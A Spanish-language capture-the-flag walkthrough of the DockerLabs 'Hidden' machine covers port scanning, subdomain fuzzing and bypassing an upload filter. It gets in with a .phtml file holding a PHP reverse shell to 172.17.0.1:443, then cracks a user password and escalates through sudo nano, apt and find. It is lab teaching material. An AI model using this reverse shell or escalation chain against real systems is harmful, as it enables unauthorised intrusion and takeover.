Máquina "Hidden" de la plataforma [DockerLabs](https://dockerlabs.es)

Autor: [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

Dificultad: Medio

![Hidden](images/hidden/img/Dockerlabs.png)

# Reconocimiento

Comenzamos con un escaneo de `nmap`:

```css
nmap -sSVC -p- -Pn -n --open --min-rate 5000 -vvv 172.17.0.2 -oN escaneo.txt
```

```ruby
# Nmap 7.95 scan initiated Sun Dec 15 01:33:23 2024 as: nmap -sSVC -p- -Pn -n --open --min-rate 5000 -vvv -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000014s latency).
Scanned at 2024-12-15 01:33:24 -03 for 8s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://hidden.lab/
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: localhost

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 15 01:33:32 2024 -- 1 IP address (1 host up) scanned in 8.59 seconds
```

vemos un solo puerto abierto:

• `Puerto 80: Apache httpd 2.4.52`

Si vemos en el escaneo, tenemos un dominio:

`"hidden.lab"`

por lo que lo añadiremos al `/etc/hosts` de la siguiente manera:

```css
echo "172.17.0.2	hidden.lab" >> /etc/hosts
```

Una vez entramos desde el navegador, no encontramos nada útil, pero teniendo en cuenta que hay un dominio, también puede tener un subdominio, por lo que usaremos `ffuf` para intentar fuzzear subdominios. Para hacerlo, debemos ejecutarlo de la siguiente manera:

```css
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://hidden.lab" -H "Host: FUZZ.hidden.lab" -fl 10
```

```ruby

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://hidden.lab
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.hidden.lab
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 10
________________________________________________

dev                     [Status: 200, Size: 1653, Words: 550, Lines: 58, Duration: 2ms]
:: Progress: [114441/114441] :: Job [1/1] :: 11111 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
```

Como vemos tenemos un subdominio, por lo que volveremos a editar el `/etc/hosts` pero borramos lo que hicimos antes y ponemos esto en la misma linea:

```css
172.17.0.2	hidden.lab dev.hidden.lab
```

Ahora si vamos desde la web, veremos el siguiente panel de subida de archivos:

![Subir_Archivos](images/hidden/img/Panel.png)

# Intrusión

Si leemos bien, dice que no se permite la subida de php, pero podriamos intentar subir un phtml. Para esto, creamos un archivo llamado "shell.phtml" y ponemos el siguiente contenido:

```php
<?php
system("bash -c 'bash -i >& /dev/tcp/172.17.0.1/443 0>&1'");
?>
```

Luego, lo subimos en la web, escuchamos con netcat en el puerto 443 (`sudo nc -nlvp 443`) y luego vamos a `/uploads/shell.phtml`. Una vez hacemos todo eso, ya estaremos dentro de la maquina.

# Escalada de privilegios

### www-data

Siendo www-data, creamos un script en `/tmp` el cual dentro tenga copiado el siguiente script:

[Multi-su_force.sh](https://github.com/Maciferna/multi-Su_Force/blob/main/multi-su_force.sh)

Una vez lo tenemos, ejecutamos lo siguiente en nuestro host:

```css
sudo apt install xclip && cat /user/share/wordlist/rockyou.txt | head -n 500 | xclip -sel clip
```

esto lo que hará, sera instalar `xclip` si no lo tenemos, y luego copiar las primeras 500 lineas del rockyou (esa ruta es para kali linux, se debe cambiar en caso que no esté ahi), luego volvemos a la maquina y creamos la wordlist con las contraseñas. Una vez ejecutado el script, veremos lo siguiente:

![Cafetero-pass](images/hidden/img/cafetero.png)

(si no funciona, se debe cambiar la linea del script que dice `if timeout 0.073` por `if timeout 0.1`)

Teniendo la contraseña, escalamos a el usuario "cafetero" con `su cafetero`.

### Cafetero

Si ejecutamos `sudo -l` veremos que podemos ejecutar `nano` como el usuario "john", por lo que vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) para poder escalar al usuario john.

### John

Nuevamente, si ejecutamos `sudo -l` veremos que podemos ejecutar `apt` como el usuario "bobby", y para escalar debemos ejecutar lo siguiente:

```css
sudo -u bobby apt changelog apt
```

y luego de ejecutarlo escribir lo siguiente y darle al enter:

```css
!/bin/bash
```

### Bobby

Siendo bobby, podremos ejecutar el binario `find` como root, y para escalar debemos ejecutar lo siguiente:

```css
sudo find . -exec /bin/bash \; -quit
```

## Root

![Root](images/hidden/img/root.png)



Gracias por leer :)